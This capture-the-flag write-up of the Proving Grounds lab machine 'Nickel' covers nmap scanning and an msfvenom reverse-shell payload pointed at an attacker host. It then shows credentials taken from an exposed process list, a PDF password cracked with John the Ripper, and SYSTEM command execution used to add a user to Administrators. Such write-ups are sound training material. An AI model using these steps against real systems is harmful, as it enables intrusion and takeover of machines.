---
description: Writeup for Nickel from Offensive Security Proving Grounds (PG)
---

# Nickel

## Information Gathering

### Service Enumeration

`nmapAutomator.sh -H 192.168.90.99 -t full`

`nmapAutomator.sh -H 192.168.90.99 -t vulns`

![](../../.gitbook/assets/1045d818848140149939ce15119699b7.png)

### SMB \(139\)

![](../../.gitbook/assets/64cdf5bd2faa4a01852053c13908f9fb.png)

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.90 LPORT=443 EXITFUNC=thread -f python`

### HTTP

On port 8089, we have a dashboard:

![](../../.gitbook/assets/a3933bd9bebf4c0a9c93c5fe44503947.png)

Each of the links bring us to 169.254.109.39:33333. By going to 192.168.90.99:33333 instead, we get a Not Found response for `/list-current-deployments`.

![](../../.gitbook/assets/4cec4421bd9c4158bb1880db75fa179d.png)

We get a different message, however, for `/list-running-procs`.

![](../../.gitbook/assets/cf537764455c492e83a0948e6ba495bc.png)

If we send a POST request instead, we indeed see a list of running processes!

![](../../.gitbook/assets/5eb1b60892d4431cbdebe0d177a076dd.png)

In the command line of one of the processes, we get a user's credentials.

![](../../.gitbook/assets/ab277a17ba334b6998e3a7cd268c2cce.png)

Plugging the `-p` parameter into CyberChef, we can see that it is a Base 64 encoded password \(`NowiseSloopTheory139`\)

![](../../.gitbook/assets/41e26e8cf30747bca4f5fddfb09b08fd.png)

Using the credentials `ariah:NowiseSloopTheory139`, we can SSH into the server.

![](../../.gitbook/assets/5838d7d87c9b40a19bc5ff39adeb3c86.png)

![](../../.gitbook/assets/4aa83527e8ca4029a2024db4ddbf153c.png)

## Privilege Escalation

Using previously found credentials for `ariah`, we can access the FTP service and download a PDF file.

![](../../.gitbook/assets/8ca2b5288277417a80cbfd0b4f79db4e.png)

However, a password is required. The previously found password does not work.

![](../../.gitbook/assets/f2fb41921fb54cf89abdf79a2b6fb456.png)

Use `pdf2john.pl` to extract the hash.

`perl john-bleeding-jumbo/run/pdf2john.pl Infrastructure.pdf > Infrastructure-Hash.txt`

Use John the Ripper to crack the hash.

`john --wordlist=/usr/share/wordlists/rockyou.txt Infrastructure-Hash.txt`

![](../../.gitbook/assets/3bd8f13aa95d477dabe49c1be7bbf17f.png)

The password is `ariah4168`.

Here, we find a 'Temporary Command endpoint' at `http://nickel/` that is only accessible through the remote machine.

![](../../.gitbook/assets/1aa2582346c249ba9df0f07d81277f76.png)

Using Powershell, we can send a GET request to the API endpoint.

`$Resp = Invoke-WebRequest 'http://nickel/?whoami' -UseBasicParsing`

This executes `whoami`, and we can see the output below.

![](../../.gitbook/assets/f500a3e48246421d95b2ad7cf6000dd7.png)

We have RCE as SYSTEM. However, any outgoing traffic is blocked, so we cannot spawn a second reverse shell as SYSTEM. Let's do the next best thing - adding ourselves to the `Administrators` group.

`localgroup Administrators ariah /add`

![](../../.gitbook/assets/cea4dbb492834bf1b1ee05bad6691f6d.png)

If we check the Administrators group again \(`net localgroup Administrators`\), we can see that our user `ariah` was added.

![](../../.gitbook/assets/08e2c6ebc57c40b38e0dfa2befa4c23e.png)

Now, we can RDP into the machine and run the command prompt as Administrator.

![](../../.gitbook/assets/25b536a08bb1444ca6ae2e30db8ab979.png)

